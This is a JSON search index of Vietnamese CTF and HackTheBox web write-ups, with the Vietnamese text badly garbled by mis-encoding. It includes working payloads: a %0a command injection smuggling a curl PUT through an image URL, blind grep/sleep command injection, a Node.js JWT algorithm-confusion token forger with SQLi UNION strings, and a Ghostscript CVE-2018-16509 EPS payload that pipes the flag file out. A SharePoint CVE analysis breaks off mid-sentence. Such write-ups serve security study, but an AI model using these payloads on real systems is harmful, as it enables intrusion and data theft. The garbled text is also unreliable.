ƒë∆∞·ª£c mutation n√†y tr·∫£ v·ªÅ object ki·ªÉu Auth, ngay d∆∞·ªõi mutation n√†y c√≥ m√¥ t·∫£ v·ªÅ type Auth{ &quot;description&quot;: &quot;Auth info for a user&quot;, &quot;enumValues&quot;: null, &quot;fields&quot;: [{ &quot;args&quot;: [ ], &quot;deprecationReason&quot;: null, &quot;description&quot;: &quot;The token&quot;, &quot;isDeprecated&quot;: false, &quot;name&quot;: &quot;token&quot;, &quot;type&quot;: { &quot;kind&quot;: &quot;SCALAR&quot;, &quot;name&quot;: &quot;String&quot;, &quot;ofType&quot;: null } }, { &quot;args&quot;: [ ], &quot;deprecationReason&quot;: null, &quot;description&quot;: &quot;The user&quot;, &quot;isDeprecated&quot;: false, &quot;name&quot;: &quot;user&quot;, &quot;type&quot;: { &quot;kind&quot;: &quot;NON_NULL&quot;, &quot;name&quot;: null, &quot;ofType&quot;: { &quot;kind&quot;: &quot;OBJECT&quot;, &quot;name&quot;: &quot;User&quot;, &quot;ofType&quot;: null } } } ], &quot;inputFields&quot;: null, &quot;interfaces&quot;: [ ], &quot;kind&quot;: &quot;OBJECT&quot;, &quot;name&quot;: &quot;Auth&quot;, &quot;possibleTypes&quot;: null}B√™n trong Auth c√≥ tr∆∞·ªùng token. T√∫m v√°y l·∫°i, m√¨nh s·∫Ω t·∫°o mutation v√† truy·ªÅn v√†o username v√† password sau ƒë√≥ l·∫•y token t·ª´ response cho vi·ªác x√°c th·ª±c. Payload cu·ªëi c√πng ƒë·ªÉ ƒëƒÉng nh·∫≠p nh∆∞ sau{ &quot;operationName&quot;:&quot;UserMutation&quot;, &quot;variables&quot;:{ &quot;username&quot;:&quot;congon4tor&quot;, &quot;password&quot;:&quot;n8bboB!3%vDwiASVgKhv&quot; }, &quot;query&quot;:&quot;mutation UserMutation($username:String!, $password:String!) {\\nauthenticateUser(username:$username, password:$password){\\ntoken\\n}\\n}\\n&quot;}L·∫•y ƒë∆∞·ª£c token r·ªìi, quay l·∫°i l·∫•y flag th√¥i. Th√™m header Authorization v√†o request." }, { "title": "OPA Secret - H@acktivityCon 2021 CTF", "url": "/posts/opa-secret-h@cktivitycon-2021-ctf/", "categories": "Writeups, H@cktivityCon 2021 CTF", "tags": "ssrf, web", "date": "2021-09-19 15:55:00 +0700", "snippet": "OPA secret l√† m·ªôt trang web cho ph√©p b·∫°n qu·∫£n l√Ω c√°c kh√≥a b√≠ m·∫≠t c·ªßa m√¨nh, c√≥ ch·ª©c nƒÉng ƒëƒÉng k√Ω ƒëƒÉng nh·∫≠p. Giao di·ªán qu·∫£n l√Ω c√°c kh√≥a nh∆∞ sau·ªû ƒë√¢y c√≥ c√°c ch·ª©c nƒÉng t·∫°o kh√≥a, thay ƒë·ªïi gi√° tr·ªã kh√≥a v√† ph√¢n quy·ªÅn read v√† write·ªû ph·∫ßn setting t√†i kho·∫£n, c√≥ th·ªÉ ƒë·∫∑t ·∫£nh ƒë·∫°i di·ªán cho t√†i kho·∫£n b·∫±ng url d·∫´n t·ªõi ·∫£nh, c√°i n√†y c√≥ ti·ªÅm nƒÉng cho t·∫•n c√¥ng ssrf.Oke v·∫≠y l√† ƒë√£ ƒëi qua c√°c ch·ª©c nƒÉng c·ªßa trang web, gi·ªù c·∫ßn ng√≥ sang ph·∫ßn m√£ ngu·ªìn, to√†n b·ªô ph·∫ßn x·ª≠ l√Ω backend ƒë∆∞·ª£c th·ª±c hi·ªán b√™n trong app.py. Sau m·ªôt h·ªìi xem x√©t m√¨nh th·∫•y c√°c h√†m x·ª≠ l√Ω c√≥ g·ªçi ƒë·∫øn m·ªôt internal urlkh·∫£ nƒÉng cao l√† web c√≤n thay ƒë·ªïi d·ªØ li·ªáu c·ªßa database ch·ª© kh√¥ng ch·ªâ thao t√°c v·ªõi d·ªØ li·ªáu qua c√°c bi·∫øn m·∫£ng. K·∫øt h·ª£p ƒëi·ªÅu n√†y v·ªõi ch·ª©c nƒÉng thay ƒë·ªïi ·∫£nh ƒë·∫°i di·ªán k·∫øt qu·∫£ s·∫Ω l√† SSRF.Ti·∫øp theo l√† xem x√©t flag n·∫±m ·ªü ƒë√¢u. Trang web n√†y khi v·ª´a ch·∫°y s·∫Ω t·ª± ƒë·ªông t·∫°o ra m·ªôt s·ªë account v√† kh√≥a ban ƒë·∫ßu. Trong ƒë√≥ kh√≥a flag thu·ªôc v·ªÅ user adminOke v·∫≠y ƒë·ªÉ l·∫•y ƒë∆∞·ª£c c·ªù th√¨ m√¨nh ph·∫£i c√≥ trong tay m·ªôt t√†i kho·∫£n user c√≥ quy·ªÅn √≠t nh·∫•t l√† read c√°i kh√≥a n√†y. Ki·ªÉm tra ch·ª©c nƒÉng ph√¢n quy·ªÅn kh√≥aH√†m add_reader th·ª±c thi c√¥ng vi·ªác th√™m quy·ªÅn read kh√≥a cho m·ªôt user theo id c·ªßa user ƒë√≥, ƒë·ªÉ ƒë·ª° m·∫•t c√¥ng m√¨nh s·∫Ω l·∫•y lu√¥n id c·ªßa m·ªôt trong c√°c t√†i kho·∫£n ƒë∆∞·ª£c t·∫°o ban ƒë·∫ßu kh·ªèi c·∫ßn t·∫°o t√†i kho·∫£n kh√°c{&quot;id&quot;:&quot;243eae36-621a-47a6-b306-841bbffbcac4&quot;}v√† id kh√≥a flag nh∆∞ sau{&quot;id&quot;: &quot;afce78a8-23d6-4f07-81f2-47c96ddb10cf&quot;}Oke v·∫≠y l√† ƒë√£ c√≥ request ƒë·ªÉ th√™m quy·ªÅn ƒë·ªçc kh√≥a flag cho user c·ªßa m√¨nh. V√¨ l√† ssrf n√™n kh√¥ng c·∫ßn x√°c th·ª±c g√¨ th√™m. Ti·∫øp theo xem ƒëo·∫°n code x·ª≠ l√Ω thay ·∫£nh ƒë·∫°i di·ªán, nh∆∞ ƒë√£ n√≥i ·ªü tr√™n ƒë√¢y l√† v·ªã tr√≠ ti·ªÅm rƒÉng cho ssrf.Url ·∫£nh ƒë∆∞·ª£c ƒë∆∞a qua blacklist, sau ƒë√≥ ƒë∆∞·ª£c g·ªçi b·∫±ng os command l√† curlcmd = f&quot;curl --request GET {url} --output ./static/images/{user[&#39;id&#39;]} --proto =http,https&quot;status = os.system(cmd)·ªû ƒë√¢y command b·∫Øt bu·ªôc l√† get, tuy nhi√™n request m√¨nh c·∫ßn l√† put. Nh∆∞ v·∫≠y m√¨nh c·∫ßn t·∫°o th√™m m·ªôt curl request n·ªØa th√¥ng qua url. ·ªû ƒë√¢y c√≥ m·ªôt k·ªπ thu·∫≠t s·ª≠ d·ª•ng %0a l√† url encode c·ªßa k√Ω t·ª± xu·ªëng h√†ng.Khi n√†y command ƒë∆∞·ª£c th·ª±c thi b·ªüi os s·∫Ω b·ªã t√°ch ra l√†m hai command ri√™ng. Sau khi th·ª≠ nghi·ªám th√¨ url ƒë·∫ßy ƒë·ªß c·ªßa m√¨nh nh∆∞ sauurl=https://i.pinimg.com/originals/d0/e0/60/d0e06034b750ed272354454ec3ef9dc2.jpg%0acurl%20--request%20PUT%20--header%20&quot;Content-Type:%20application/json&quot;%20--data%20[b2f0aa09-4a78-4bfd-9367-8f0e77d05efd]%20http://localhost:8181/v1/data/readers/afce78a8-23d6-4f07-81f2-47c96ddb10cfK·∫øt qu·∫£ g·ª≠i requestV·∫≠y l√† ƒë√£ th√™m quy·ªÅn ƒë·ªçc flag th√†nh c√¥ng, b√¢y gi·ªù ch·ªâ c·∫ßn g·ªçi request ƒë·ªÉ l·∫•y value c·ªßa kh√≥a th√¥i" }, { "title": "Availability - H@cktivityCon 2021 CTF", "url": "/posts/availability-h@cktivitycon-2021-ctf/", "categories": "Writeups, H@cktivityCon 2021 CTF", "tags": "brute force, web", "date": "2021-09-19 15:55:00 +0700", "snippet": "Availability l√† m·ªôt trong 3 b√†i v·ªÅ t√≠nh b·∫£o m·∫≠t CIA, trong 3 b√†i th√¨ b√†i n√†y ƒë∆∞·ª£c ƒë√°nh gi√° l√† hard. T∆∞∆°ng t·ª± nh∆∞ 2 b√†i kia. Trang web ch·ªâ c√≥ m·ªôt giao di·ªán duy nh·∫•t c√πng m·ªôt √¥ input.Trang web n√†y gi√∫p ch√∫ng ta ki·ªÉm tra t√≠nh s·∫µn s√†ng c·ªßa m·ªôt host b·∫•t k·ª≥Do ch·ªâ c√≥ m·ªôt ch·ª©c nƒÉng duy nh·∫•t n√™n ch·ªâ c·∫ßn b·∫Øt request v√† thay ƒë·ªïi payload th√¥i. D·∫°ng b√†i n√†y kh√° l√† c·ª•c s√∫c. T∆∞∆°ng t·ª± b√†i Integrity m√¨nh s·ª≠ d·ª•ng %0a (xu·ªëng d√≤ng) ƒë·ªÉ t·∫°o command m·ªõi.Nh∆∞ng l√†m th·∫ø n√†o ƒë·ªÉ x√°c ƒë·ªãnh command m·ªõi ƒë√£ ƒë∆∞·ª£c ch·∫°y khi trang web b√¢y gi·ªù kh√¥ng tr·∫£ v·ªÅ b·∫•t k·ª≥ th√¥ng tin g√¨ nh∆∞ anh em n√≥. B√≠ quy·∫øt l√† h√†m sleepQuan s√°t g√≥c d∆∞·ªõi c√πng b√™n ph·∫£i th·∫•y request m·∫•t h∆°n 5s m·ªõi ƒë∆∞·ª£c th·ª±c hi·ªán, v·∫≠y l√† command ƒë√£ ƒë∆∞·ª£c ch·∫°y. Ti·∫øp theo c·∫ßn suy nghƒ© m·ªôt ch√∫t, do trang web b√¢y gi·ªù kh√¥ng tr·∫£ v·ªÅ b·∫•t k·ª≥ th√¥ng tin g√¨ v·ªÅ k·∫øt qu·∫£ ch·∫°y command n√™n kh·∫£ nƒÉng cao ƒë√¢y l√† m·ªôt d·∫°ng Boolean-based command injection. M√¨nh ƒë√£ th·ª≠ gi·ªùi ∆°i ƒë·∫•t h·ª°i c√¢u l·ªánh tr√™n m·∫°ng v·ªÅ boolean based tuy nhi√™n kh√¥ng k·∫øt qu·∫£ n√†o qua ƒë∆∞·ª£c blacklist.M√¨nh quay l·∫°i v·ªõi c√¢u l·ªánh l·ªçc n·ªôi dung file c∆° b·∫£n l√† grep. T∆∞∆°ng t·ª± nh∆∞ hai b√†i anh em, b√†i n√†y flag c≈©ng ƒë∆∞·ª£c gi·∫•u trong file flag.txt v√† flag c√≥ ƒë·ªãnh d·∫°ng flag{abcxyz}Th·ª≠ grep v·ªõi ‚Äúflag‚Äùoke chu·∫©n. ti·∫øp theo th·ª≠ m·ªôt chu·ªói c·ª±c k·ª≥ v√¥ l√Ω ƒëiK·∫øt lu·∫≠n, n·∫øu chu·ªói m√¨nh ƒë∆∞a v√†o kh√¥ng n·∫±m trong flag th√¨ s·∫Ω b√°o l·ªói, c√≥ th√¨ s·∫Ω th√†nh c√¥ng. D·ª±a v√†o c√°i n√†y ƒë·ªÉ brute force ƒë∆∞·ª£c ƒë·∫ßy ƒë·ªß flag. May m·∫Øn l√† c√°c k√Ω t·ª± trong c·ªù kh√¥ng qu√° ph·ª©c t·∫°p n√™n vi·ªác brute force ƒë·ª° m·∫•t th·ªùi gian.K·∫øt qu·∫£ brute force d·ª´ng l·∫°i ·ªü 1 chu·ªóiV·∫≠y flag s·∫Ω l√† flag{c11d098dd25a08816027174c14f7bf60}.Ban ƒë·∫ßu m√¨nh kh√¥ng s·ª≠ d·ª•ng grep l√† do grep s·∫Ω kh√¥ng tr·∫£ v·ªÅ l·ªói n√™n kh·∫£ nƒÉng kh√¥ng boolean-based ƒë∆∞·ª£c. Kinh nghi·ªám r√∫t ra cho c√°c b·∫°n l√† c·ª© th·ª≠ t·∫•t üòÜ." }, { "title": "HTB Under Construction", "url": "/posts/htb-under-construction/", "categories": "Writeups, HackTheBox", "tags": "sqli, jwt", "date": "2021-09-06 02:07:00 +0700", "snippet": "Under Contruction d·∫´n ng∆∞·ªùi d√πng th·∫≥ng v√†o m·ªôt trang loginM√¨nh ƒë√£ th·ª≠ detect SQLi ·ªü ƒë√¢y tuy nhi√™n kh√¥ng th·ªÉ khai th√°c ƒë∆∞·ª£c g√¨, th·ª≠ ƒëƒÉng k√Ω m·ªôt t√†i kho·∫£n ƒë∆°n sau ƒë√≥ login v√†oOK giao di·ªán n√†y l√† l√Ω do challenge c√≥ t√™n l√† ‚Äòunder construction‚Äô üòÇüòÇ. V√† trong giao di·ªán n√†y kh√¥ng h·ªÅ c√≥ th√™m ch·ª©c nƒÉng g√¨. Th·ª≠ xem cookie c√≥ g√¨ hay kh√¥ng ? session=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJwayI6Ii0tLS0tQkVHSU4gUFVCTElDIEtFWS0tLS0tXG5NSUlCSWpBTkJna3Foa2lHOXcwQkFRRUZBQU9DQVE4QU1JSUJDZ0tDQVFFQTk1b1RtOUROemNIcjhnTGhqWmFZXG5rdHNiajFLeHhVT296dzB0clA5M0JnSXBYdjZXaXBRUkI1bHFvZlBsVTZGQjk5SmM1UVowNDU5dDczZ2dWRFFpXG5YdUNNSTJob1VmSjFWbWpOZVdDclNyRFVob2tJRlpFdUN1bWVod3d0VU51RXYwZXpDNTRaVGRFQzVZU1RBT3pnXG5qSVdhbHNIai9nYTVaRUR4M0V4dDBNaDVBRXdiQUQ3MytxWFMvdUN2aGZhamdwekhHZDlPZ05RVTYwTE1mMm1IXG4rRnluTnNqTk53bzVuUmU3dFIxMldiMllPQ3h3MnZkYW1PMW4xa2YvU015cFNLS3ZPZ2o1eTBMR2lVM2plWE14XG5WOFdTK1lpWUNVNU9CQW1UY3oydzJrekJoWkZsSDZSSzRtcXVleEpIcmEyM0lHdjVVSjVHVlBFWHBkQ3FLM1RyXG4wd0lEQVFBQlxuLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tXG4iLCJpYXQiOjE2MzA4NTc1NDF9.EU9cSpXjqAbjMwbg68QSKDpv-StQSWvjjHhI_5-4eNbyEk_sfnKcsFShYChzc3YsISG6ZNB58yfegyaK6SC41tBrmXBJb2U80eLk1F5QWf6PKsjVWXnPbNIcse6iCSd6UR0gVdXCN5q0I6VesipTr0dGRloUKYkAGEb17FUt2k1xdMPCLiinNXIQZ_3i4Gd0hpvo9rqA4HVWRWZgNqUL5O2qrm1otx8OpdGg4InWy9WaC9TiyLAdjkUtJSNdn_1IiiYn0tt8858jWyaVAm_-EEztGDikfkghdYehkuFEum7fZ0f4Ut9YgjjkFN6CQu4mg5RK5WcfGiq6uf69Y7AOrwNh·∫≠n th·∫•y r·∫±ng session n√†y c√≥ d·∫°ng aa.bb.cc =&amp;gt; Kh·∫£ nƒÉng cao session n√†y l√† Json Web Token (Jwt). Sau khi th·ª≠ thay ƒë·ªïi nh·ªè tr√™n gi√° tr·ªã session, m√¨nh nh·∫≠n ƒë∆∞·ª£c l·ªói 500 t·ª´ server.V·∫≠y blackbox ch·ªâ d·ª´ng l·∫°i v·ªõi c√°c ch·ªó c·∫ßn l∆∞u √Ω l√† form ƒëƒÉng k√Ω ƒëƒÉng nh·∫≠p v√† session. Vi·ªác c·∫ßn l√†m ti·∫øp theo l√† review code.// AuthMiddleware classmodule.exports = async (req, res, next) =&amp;gt; { try{ if (req.cookies.session === undefined) return res.redirect(&#39;/auth&#39;); let data = await JWTHelper.decode(req.cookies.session); req.data = { username: data.username } next(); } catch(e) { console.log(e); return res.status(500).send(&#39;Internal server error&#39;); }}H·ªá th·ªëng s·ª≠ d·ª•ng middleware AuthMiddleware ƒë·ªÉ ki·ªÉm tra user ƒë√£ ƒëƒÉng nh·∫≠p hay ch∆∞a b·∫±ng c√°ch decode jwt token ƒë·ªÉ l·∫•y ƒë∆∞·ª£c username. Sau ƒë√≥ username n√†y ƒë∆∞·ª£c ƒë∆∞a v√†o h√†m DBHelper.getUser ƒë·ªÉ l·∫•y th√¥ng tin user ƒë√£ ƒëƒÉng nh·∫≠p.// DBHelper classgetUser(username){ return new Promise((res, rej) =&amp;gt; { db.get(`SELECT * FROM users WHERE username = &#39;${username}&#39;`, (err, data) =&amp;gt; { if (err) return rej(err); res(data); }); });}ƒêo·∫°n code n√†y ƒë∆∞a username ƒë∆∞·ª£c l·∫•y t·ª´ token v√†o c√¢u query =&amp;gt; SQLi.Ti·∫øp theo ƒë·ªÉ exploit ƒë∆∞·ª£c c·∫ßn t·∫°o m·ªôt token th·ªß c√¥ng h·ª£p l·ªá. Do m√¨nh ch·ªâ hi·ªÉu c∆° b·∫£n v√† bi·∫øt c√°ch s·ª≠ d·ª•ng jwt m√† kh√¥ng quan t√¢m l·∫Øm ƒë·∫øn thu·∫≠t to√°n m√£ h√≥a m√† n√≥ s·ª≠ d·ª•ng, n√™n c·∫ßn b·ªè th·ªùi gian ƒë·ªÉ t√¨m hi·ªÉu th√™m. Sau m·ªôt th·ªùi gian th√¨ t√¨m ƒë∆∞·ª£c m·ªôt t√†i li·ªáu v·ªÅ m·ªôt l·ªói t·ªìn t·∫°i b√™n trong c√°c th∆∞ vi·ªán jwt. Algorithm confusion In many JWT libraries, the method to verify the signature is: verify(token, secret) ‚Äì if the token is signed with HMAC verify(token, publicKey) ‚Äì if the token is signed with RSA or similar Unfortunately, in some libraries, this method by itself does not check whether the received token is signed using the application‚Äôs expected algorithm. That‚Äôs why in the case of HMAC this method will treat the second argument as a shared secret and in the case of RSA as a public key.If the public key is accessible within the application, an attacker can forge malicious tokens by: Changing the algorithm of the token to HMAC Tampering with the payload to get the desired outcome Signing the malicious token with the public key found in the application Sending the JWT back to the application The application expects RSA encryption, so when an attacker supplies HMAC instead, the verify() method will treat the public key as an HMAC shared secret and use symmetric rather than asymmetric encryption. This means that the token will be signed using the application‚Äôs non-secret public key and then verified using the same public key.H·ªá th·ªëng sinh token s·ª≠ d·ª•ng m√£ h√≥a b·∫•t ƒë·ªëi x·ª©ng RS256async sign(data) { data = Object.assign(data, {pk:publicKey}); return (await jwt.sign(data, privateKey, { algorithm:&#39;RS256&#39; }))},async decode(token) { return (await jwt.verify(token, publicKey, { algorithms: [&#39;RS256&#39;, &#39;HS256&#39;] }));}Tuy nhi√™n verify l·∫°i cho ph√©p m√£ h√≥a ƒë·ªëi x·ª©ng HS256. Khi ƒë√≥ c√≥ th·ªÉ t·∫°o ra m·ªôt token h·ª£p l·ªá b·∫±ng thu·∫≠t to√°n m√£ h√≥a ƒë·ªëi x·ª©ng HS256 v√† public key. Khi token ƒë∆∞·ª£c verify, jwt s·∫Ω coi public key nh∆∞ l√† shared key.Public key c√≥ ƒë∆∞·ª£c b·∫±ng c√°ch decode token l·∫•y ƒë∆∞·ª£c sau khi ƒëƒÉng nh·∫≠p.ƒê·∫øn ƒë√¢y m√¨nh s·ª≠ d·ª•ng c√°c tool online tuy nhi√™n qua bao nhi√™u l·∫ßn t·∫°o token h·ªá th·ªëng ƒë·ªÅu tr·∫£ v·ªÅ l·ªói 500 üò∂. Qu√° cay c√∫ m√¨nh code l·∫°i ƒëo·∫°n sinh token theo ƒë√∫ng ng√¥n ng·ªØ v√† framework c·ªßa challenge.const jwt = require(&#39;jsonwebtoken&#39;);var publicKey = &quot;-----BEGIN PUBLIC KEY-----\\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA95oTm9DNzcHr8gLhjZaY\\nktsbj1KxxUOozw0trP93BgIpXv6WipQRB5lqofPlU6FB99Jc5QZ0459t73ggVDQi\\nXuCMI2hoUfJ1VmjNeWCrSrDUhokIFZEuCumehwwtUNuEv0ezC54ZTdEC5YSTAOzg\\njIWalsHj/ga5ZEDx3Ext0Mh5AEwbAD73+qXS/uCvhfajgpzHGd9OgNQU60LMf2mH\\n+FynNsjNNwo5nRe7tR12Wb2YOCxw2vdamO1n1kf/SMypSKKvOgj5y0LGiU3jeXMx\\nV8WS+YiYCU5OBAmTcz2w2kzBhZFlH6RK4mquexJHra23IGv5UJ5GVPEXpdCqK3Tr\\n0wIDAQAB\\n-----END PUBLIC KEY-----\\n&quot;var payload = { &quot;username&quot;: &quot;hoangnd&quot;, &quot;pk&quot;: &quot;-----BEGIN PUBLIC KEY-----\\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA95oTm9DNzcHr8gLhjZaY\\nktsbj1KxxUOozw0trP93BgIpXv6WipQRB5lqofPlU6FB99Jc5QZ0459t73ggVDQi\\nXuCMI2hoUfJ1VmjNeWCrSrDUhokIFZEuCumehwwtUNuEv0ezC54ZTdEC5YSTAOzg\\njIWalsHj/ga5ZEDx3Ext0Mh5AEwbAD73+qXS/uCvhfajgpzHGd9OgNQU60LMf2mH\\n+FynNsjNNwo5nRe7tR12Wb2YOCxw2vdamO1n1kf/SMypSKKvOgj5y0LGiU3jeXMx\\nV8WS+YiYCU5OBAmTcz2w2kzBhZFlH6RK4mquexJHra23IGv5UJ5GVPEXpdCqK3Tr\\n0wIDAQAB\\n-----END PUBLIC KEY-----\\n&quot;, &quot;iat&quot;: 1630851097}var token = console.log(jwt.sign(payload, publicKey)) // M·∫∑c ƒë·ªãnh h√†m sign s·∫Ω s·ª≠ d·ª•ng m√£ h√≥a ƒë·ªëi x·ª©ng HS256Sau khi s·ª≠ d·ª•ng token t·ª´ code n√†y th√¨ worked. Th·ª≠ detect SQLi qua username=&quot;hoangnd&#39;&quot; xem th·∫ø n√†oSQLi verified. ƒê·ªÉ √Ω rƒÉng k·∫øt qu·∫£ query database tr·∫£ v·ªÅ trong message ·ªü trang ch·ªß. Ti·∫øp theo l√† d√πng UNION attack username=&quot;aaa&#39; union select &#39;mot&#39;,&#39;hai&#39;,&#39;ba&#39;; -- a&quot;, ph·∫ßn username hi·ªÉn th·ªã tr√™n message ·ªü trang ch·ªß nh∆∞ sauNh∆∞ v·∫≠y data c√≥ th·ªÉ l·∫•y ra t·ª´ column th·ª© hai c·ªßa c√¢u query. B∆∞·ªõc ti·∫øp theo ch·ªâ c·∫ßn th√™m m·ªôt √≠t ki·∫øn th·ª©c v·ªÅ query trong SQLite ƒë·ªÉ l·∫•y ƒë∆∞·ª£c flag, m√¨nh xin ph√©p d·ª´ng b√†i vi·∫øt ·ªü ƒë√¢y." }, { "title": "HTB Petpet Rcbee", "url": "/posts/htb-petpet-rcbee/", "categories": "Writeups, HackTheBox", "tags": "pil, ghost script", "date": "2021-09-05 08:51:00 +0700", "snippet": "Petpet rcbee l√† m·ªôt web challenge. Sau khi xem x√©t th√¨ th·∫•y r·∫±ng trang web ch·ªâ c√≥ m·ªôt ch·ª©c nƒÉng duy nh·∫•t l√† upload 1 ·∫£nh sau ƒë√≥ ‚Äúpet‚Äù ·∫£nh n√†y.Oke ki·ªÉm tra source code xem c√≥ g√¨ c√≥ th·ªÉ l·ª£i d·ª•ng ƒë·ªÉ RCE th√¥ng qua file ƒë∆∞·ª£c t·∫£i l√™n hay kh√¥ngdef petpet(file): if not allowed_file(file.filename): return {&#39;status&#39;: &#39;failed&#39;, &#39;message&#39;: &#39;Improper filename&#39;}, 400 try: tmp_path = save_tmp(file) bee = Image.open(tmp_path).convert(&#39;RGBA&#39;) frames = [Image.open(f) for f in sorted(glob.glob(&#39;application/static/img/*&#39;))] finalpet = petmotion(bee, frames) filename = f&#39;{generate(14)}.gif&#39; finalpet[0].save( f&#39;{main.app.config[&quot;UPLOAD_FOLDER&quot;]}/{filename}&#39;, save_all=True, duration=30, loop=0, append_images=finalpet[1:], ) os.unlink(tmp_path) return {&#39;status&#39;: &#39;success&#39;, &#39;image&#39;: f&#39;static/petpets/{filename}&#39;}, 200 except: return {&#39;status&#39;: &#39;failed&#39;, &#39;message&#39;: &#39;Something went wrong&#39;}, 500·∫¢nh sau khi ƒë∆∞·ª£c t·∫£i ƒë∆∞·ª£c x·ª≠ l√Ω b·∫±ng h√†m petpet. B√™n trong th·ª±c hi·ªán c√°c thao t√°c nh∆∞ l∆∞u ·∫£nh v√†o file t·∫°m, generate m·ªôt ·∫£nh gif d·ª±a tr√™n ·∫£nh n√†y, sau ƒë√≥ ƒë∆∞a n√≥ v√†o th∆∞ m·ª•c theo ƒë∆∞·ªùng d·∫´n l√† bi·∫øn UPLOAD_FOLDER ·ªü trong config. Cu·ªëi c√πng l√† x√≥a ·∫£nh trong tmp.Trang web n√†y s·ª≠ d·ª•ng m·ªôt th∆∞ vi·ªán l√† PIL ƒë·ªÉ x·ª≠ l√Ω ·∫£nh, ƒë·ªÉ xem PIL c√≥ CVE n√†o k. Sau khi xem x√©t m·ªôt v√≤ng th√¨ c√≥ 1 CVE li√™n quan ƒë·∫øn PIL v√† Ghostscript ƒë·ªÉ RCE l√† CVE-2018-16509, check l·∫°i th√¨ b√™n trong file docker c√≥ t·ªìn t·∫°i c√°i g·ªçi l√† Ghostscript th·∫≠t.S·ª≠ d·ª•ng lu√¥n craft image c·ªßa CVE, ch·∫°y th·ª≠ tr√™n localOke v·∫≠y l√† ƒë√£ RCE ƒë∆∞·ª£c, b√¢y gi·ªù c·∫ßn l√†m th·∫ø n√†o ƒë·ªÉ ƒë·ªçc ƒë∆∞·ª£c flag ƒë∆∞·ª£c d·∫•u b√™n trong. ƒê·ªÉ √Ω r·∫±ng c√≥ m·ªôt ƒë∆∞·ªùng d·∫´n t·ªáp ƒë∆∞·ª£c public l√† UPLOAD_FOLDER (/static/petpets/).V·∫≠y ch·ªâ c·∫ßn ƒë·ªçc file flag v√† ghi v√†o m·ªôt file b·∫•t k·ª≥ trong ƒë∆∞·ªùng d·∫´n n√†y l√† xong.%!PS-Adobe-3.0 EPSF-3.0%%BoundingBox: -0 -0 100 100userdict /setpagedevice undefsavelegal{ null restore } stopped { pop } if{ legal } stopped { pop } ifrestoremark /OutputFile (%pipe%cat flag &amp;gt; application/static/petpets/test.txt) currentdevice putdeviceprops" }, { "title": "CVE-2021-34520 Microsoft Sharepoint RCE", "url": "/posts/cve-2021-34520-microsoft-sharepoint-RCE/", "categories": "One-day analysis", "tags": "cve-2021-34520, microsoft sharepoint", "date": "2021-09-04 10:36:00 +0700", "snippet": "Ph√¢n t√≠ch l·ªói CVE-2021-34520Sharepoint WorkflowCh√∫ng ta c√≥ th·ªÉ ph√¢n t√°ch nghƒ©a c·ªßa t·ª´ Workflow l√† l√†m 2 ph·∫ßn bao g·ªìm ‚ÄúWork‚Äù nghƒ©a l√† c√¥ng vi·ªác, ‚Äúflow‚Äù nghƒ©a l√† d√≤ng ch·∫£y. Flow ƒëi chung v·ªõi Work nghƒ©a l√† d√≤ng ch·∫£y c√¥ng vi·ªác, lu·ªìng c√¥ng vi·ªác hay g·ªçi l√† quy tr√¨nh c√¥ng vi·ªác. Workflow ƒë∆∞·ª£c hi·ªÉu l√† m·ªôt quy tr√¨nh l·∫∑p l·∫°i, bao g·ªìm c√°c nhi·ªám v·ª• c·∫ßn ph·∫£i ho√†n th√†nh theo m·ªôt quy tr√¨nh c·ª• th·ªÉ.M·ªôt workflow bao g·ªìm m·ªôt ho·∫∑c nhi·ªÅu step, trong m·ªói step l·∫°i ch·ª©a m·ªôt hay nhi·ªÅu activity (workflow action).Trong Sharepoint c√≥ 2 ki·ªÉu workflow Built-in workflow: ƒê√¢y l√† c√°c workflow ƒë∆∞·ª£c x√¢y d·ª±ng s·∫µn nh∆∞ template c·ªßa sharepoint Custom workflow: Sharepoint cho ph√©p x√¢y d·ª±ng c√°c workflow theo √Ω c·ªßa ng∆∞·ªùi d√πng. C√≥ hai c√°ch ƒë·ªÉ t·∫°o ra m·ªôt custom workflow l√† s·ª≠ d·ª•ng c√¥ng c·ª• Sharepoint Designer ho·∫∑c t·∫°o t·ª´ custom code s·ª≠ d·ª•ng Visual Studio 2012 tr·ªü v·ªÅ sau.S·ª≠ d·ª•ng workflow trong sharepoint?Tr∆∞·ªõc khi ƒë∆∞·ª£c s·ª≠ d·ª•ng, c√°c workflow sau khi ƒë∆∞·ª£c t·∫°o s·∫Ω ƒë∆∞·ª£c add cho m·ªôt list, library ho·∫∑c content type ƒë·ªÉ khi·∫øn n√≥ kh·∫£ d·ª•ng cho c√°c documents ho·∫∑c items trong danh s√°ch ƒë·∫•y. Sau ƒë√≥, c√°c workflow n√†y c√≥ th·ªÉ ch·∫°y theo c√°c option nh∆∞ sau Ch·∫°y th·ªß c√¥ng Ch·∫°y khi c√≥ thay ƒë·ªïi v·ªÅ item (th√™m, x√≥a, s·ª≠a th√¥ng tin ‚Ä¶)Workflow DesignerSharePoint Designer 2013 l√† m·ªôt ch∆∞∆°ng tr√¨nh thi·∫øt k·∫ø web v√† ·ª©ng d·ª•ng ƒë∆∞·ª£c s·ª≠ d·ª•ng ƒë·ªÉ x√¢y d·ª±ng v√† t√πy ch·ªânh c√°c trang web v√† ·ª©ng d·ª•ng tr√™n SharePoint. Sharepoint Designer gi√∫p b·∫°n t·∫°o ra c√°c trang web gi√†u d·ªØ li·ªáu, x√¢y d·ª±ng c√°c workflow m·∫°nh m·∫Ω, hay t·∫°o ra c√°c giao di·ªán ƒë·∫πp v√† d·ªÖ ch·ªãu cho trang web.M√¥ t·∫£ v·ªÅ l·ªóiT√†i li·ªáu c·ªßa ZDI m√¥ t·∫£ v·ªÅ CVE-2021-34520 nh∆∞ sau: L·ªó h·ªïng t·ªìn t·∫°i trong l·ªõp Microsoft.SharePoint.WorkflowActions.SetVariableActivity. M·ªôt th√†nh ph·∫ßn SetVariableActivity ƒë∆∞·ª£c t·∫°o th·ªß c√¥ng c√≥ th·ªÉ d·∫´n ƒë·∫øn vi·ªác kh·ªüi t·∫°o m·ªôt ki·ªÉu .NET t√πy √Ω. Attacker c√≥ th·ªÉ l·ª£i d·ª•ng l·ªó h·ªïng n√†y ƒë·ªÉ th·ª±c thi m√£ t·ª´ xa.SetVariableActivity l√† m·ªôt workflow action, v·∫≠y kh·∫£ nƒÉng cao l·ªó h·ªïng n√†y li√™n quan ƒë·∫øn 